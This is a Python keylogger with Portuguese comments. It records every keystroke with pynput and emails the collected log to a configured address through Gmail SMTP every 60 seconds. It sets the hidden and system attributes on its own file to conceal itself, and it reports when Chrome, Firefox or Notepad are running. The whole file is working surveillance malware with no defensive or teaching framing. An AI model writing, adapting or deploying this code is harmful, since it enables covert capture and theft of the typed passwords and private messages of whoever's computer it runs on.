import pynput.keyboard
import threading
import os
import time
import subprocess
import smtplib
import ssl

# Configurações de email (substitua com suas próprias informações)
email_address = "seu_email@gmail.com"
email_password = "sua_senha"
receiver_email = "email_destinatario@gmail.com"
smtp_server = "smtp.gmail.com"
smtp_port = 587

log = ""

def send_email(message):
    context = ssl.create_default_context()
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.ehlo()
        server.starttls(context=context)
        server.login(email_address, email_password)
        server.sendmail(email_address, receiver_email, message)

def key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "

def report():
    global log
    send_email(log)  # Envie o log por email
    log = ""
    timer = threading.Timer(60, report)  # Envie o email a cada 60 segundos
    timer.start()

def hide_file():
    try:
        os.system("attrib +h keylogger.py")  # Esconde o arquivo
        os.system("attrib +s +h keylogger.py")  # Torna o arquivo super oculto
    except Exception as e:
        print(str(e))

def check_processes():
    target_processes = ["chrome.exe", "firefox.exe", "notepad.exe"]  # Adicione aqui os processos dos aplicativos que deseja monitorar
    while True:
        for process in target_processes:
            try:
                subprocess.check_output(f"tasklist /FI \"IMAGENAME eq {process}\" 2>NUL | find /I /N \"{process}\"", shell=True)
                log = f"Acesso ao aplicativo detectado: {process}\n"
                send_email(log)  # Envie o log por email
            except:
                pass
        time.sleep(10)  # Verifica a cada 10 segundos

keyboard_listener = pynput.keyboard.Listener(on_press=key_press)
with keyboard_listener:
    report()
    hide_file()
    t = threading.Thread(target=check_processes)
    t.daemon = True
    t.start()
    keyboard_listener.join()
